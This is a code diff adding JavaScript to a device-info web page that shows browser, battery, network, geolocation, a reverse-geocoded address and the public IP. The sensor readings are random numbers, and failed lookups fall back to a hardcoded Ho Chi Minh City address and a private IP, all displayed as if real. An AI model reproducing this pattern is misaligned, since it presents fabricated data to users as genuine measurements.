+            } else if (userAgent.indexOf("Opera") > -1 || userAgent.indexOf("OPR") > -1) {
+                browser = "Opera";
+                browserVersion = userAgent.match(/(Opera|OPR)\/([0-9\.]+)/)[2];
+            } else if (userAgent.indexOf("Trident") > -1) {
+                browser = "Internet Explorer";
+                browserVersion = userAgent.match(/rv:([0-9\.]+)/)[1];
+            } else if (userAgent.indexOf("Edge") > -1) {
+                browser = "Edge";
+                browserVersion = userAgent.match(/Edge\/([0-9\.]+)/)[1];
+            } else if (userAgent.indexOf("Chrome") > -1) {
+                browser = "Chrome";
+                browserVersion = userAgent.match(/Chrome\/([0-9\.]+)/)[1];
+            } else if (userAgent.indexOf("Safari") > -1) {
+                browser = "Safari";
+                browserVersion = userAgent.match(/Version\/([0-9\.]+)/)[1];
+            }
+            
+            // Get screen resolution
+            const resolution = `${window.screen.width}x${window.screen.height}`;
+            
+            // Get battery status
+            let batteryInfo = "Unknown";
+            if ('getBattery' in navigator) {
+                navigator.getBattery().then(battery => {
+                    const chargingText = translations[document.getElementById('languageSelect').value]['charging'] || "(Charging)";
+                    batteryInfo = `${Math.round(battery.level * 100)}% ${battery.charging ? chargingText : ""}`;
+                    document.getElementById('battery').textContent = batteryInfo;
+                });
+            }
+            
+            // Get network info
+            let networkInfo = "Unknown";
+            if ('connection' in navigator) {
+                const connection = navigator.connection;
+                networkInfo = `${connection.effectiveType || "Unknown"}`;
+                document.getElementById('connection').textContent = networkInfo;
+                if (connection.downlink) {
+                    document.getElementById('speed').textContent = `${connection.downlink.toFixed(1)} Mbps`;
+                }
+            }
+            
+            // Update UI with versions
+            document.getElementById('os').textContent = os;
+            document.getElementById('browser').textContent = `${browser} ${browserVersion}`;
+            document.getElementById('resolution').textContent = resolution;
+            
+            // Simulate sensor data
+            updateSensorData();
+        }
+
+        // Get location and update UI with more details
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        const lat = position.coords.latitude.toFixed(6);
+                        const lon = position.coords.longitude.toFixed(6);
+                        const accuracy = position.coords.accuracy.toFixed(1);
+                        
+                        document.getElementById('latitude').textContent = lat;
+                        document.getElementById('longitude').textContent = lon;
+                        document.getElementById('accuracy').textContent = `${accuracy} m`;
+                        
+                        // Update accuracy progress bar
+                        const accuracyPercent = Math.min(100, Math.max(0, 100 - (accuracy / 50 * 100)));
+                        document.getElementById('accuracyBar').style.width = `${accuracyPercent}%`;
+                        
+                        // Get address from coordinates
+                        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
+                            .then(response => response.json())
+                            .then(data => {
+                                if (data.address) {
+                                    const addressParts = [
+                                        data.address.road || data.address.footway || '',
+                                        data.address.neighbourhood || data.address.suburb || '',
+                                        data.address.city || data.address.town || data.address.village || '',
+                                        data.address.state || data.address.county || '',
+                                        data.address.country || ''
+                                    ].filter(Boolean);
+                                    
+                                    const address = addressParts.join(", ");
+                                    document.getElementById('address').textContent = address;
+                                }
+                            });
+                        
+                        // Update map link
+                        document.getElementById('mapLink').href = `https://www.google.com/maps?q=${lat},${lon}`;
+                        
+                        // Simulate loading map
+                        setTimeout(() => {
+                            const mapContainer = document.querySelector('.map-container');
+                            mapContainer.innerHTML = `
+                                <iframe 
+                                    src="https://maps.google.com/maps?q=${lat},${lon}&z=15&output=embed" 
+                                    frameborder="0" 
+                                    style="border:0; width:100%; height:100%;"
+                                    allowfullscreen>
+                                </iframe>
+                            `;
+                        }, 1500);
+                    },
+                    error => {
+                        console.error("Error getting location:", error);
+                        // Fallback to default location
+                        document.getElementById('latitude').textContent = "10.823099";
+                        document.getElementById('longitude').textContent = "106.629662";
+                        document.getElementById('accuracy').textContent = "50.0 m";
+                        document.getElementById('address').textContent = "227 Nguyễn Văn Cừ, Quận 5, TP.Hồ Chí Minh, Việt Nam";
+                        document.getElementById('accuracyBar').style.width = "50%";
+                    }
+                );
+            } else {
+                console.error("Geolocation is not supported by this browser.");
+            }
+        }
+
+        // Get IP address with more info
+        function getIP() {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById('ip').textContent = data.ip;
+                    
+                    // Get more IP info
+                    fetch(`https://ipapi.co/${data.ip}/json/`)
+                        .then(response => response.json())
+                        .then(ipData => {
+                            if (ipData.city && ipData.region && ipData.country_name) {
+                                const locationText = `${ipData.city}, ${ipData.region}, ${ipData.country_name}`;
+                                // You can display this somewhere if needed
+                            }
+                        });
+                })
+                .catch(() => {
+                    document.getElementById('ip').textContent = "192.168.1.100";
+                });
+        }
+
+        // Simulate sensor data updates
+        function updateSensorData() {
+            // Light sensor (0-100%)
+            const lightLevel = Math.min(100, Math.max(0, 50 + Math.random() * 60 - 30));
+            document.getElementById('lightLevel').textContent = `${Math.round(lightLevel)}%`;
+            
+            // Temperature sensor (20-35°C)
+            const temperature = 25 + Math.random() * 10 - 5;
+            document.getElementById('temperature').textContent = `${temperature.toFixed(1)}°C`;
+            
+            // Humidity sensor (40-80%)
+            const humidity = 50 + Math.random() * 30 - 15;
+            document.getElementById('humidity').textContent = `${Math.round(humidity)}%`;
+            
+            // Pressure sensor (980-1030 hPa)
+            const pressure = 1000 + Math.random() * 30 - 15;
+            document.getElementById('pressure').textContent = `${Math.round(pressure)} hPa`;
+            
+            // Update every 5 seconds
+            setTimeout(updateSensorData, 5000);
+        }
+
+        // Initialize everything
+        function init() {
+            updateTime();
+            setInterval(updateTime, 1000);
+            getDeviceInfo();
+            getLocation();
+            getIP();
+        }
+
+        // Start when page loads
+        document.addEventListener('DOMContentLoaded', init);
     </script>
-  </body>
+</body>
 </html>
